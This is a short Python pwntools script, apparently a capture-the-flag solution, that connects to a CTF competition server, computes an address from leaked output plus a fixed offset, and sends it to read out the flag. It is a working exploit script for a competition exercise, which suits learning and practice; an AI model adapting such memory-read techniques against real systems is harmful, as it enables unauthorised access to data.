#!/usr/bin/env python3
from pwn import remote
import re

OFFSET = 0x1e0
FLAG_RE = b'CTF{.*}'

r = remote('wfw1.2023.ctfcompetition.com', 1337)

data = r.recvuntil(b'Send me nothing and I will happily expire\n')

addr = data.split(b'\n')[11][:12]
addr = int(addr, 16) + OFFSET
addr = f'{addr:#x}'.encode()

r.sendline(addr + b' 40')

data = r.recvuntil(b'Send me nothing and I will happily expire\n')
flag = re.search(FLAG_RE, data).group(0)

print(flag.decode())

r.close()
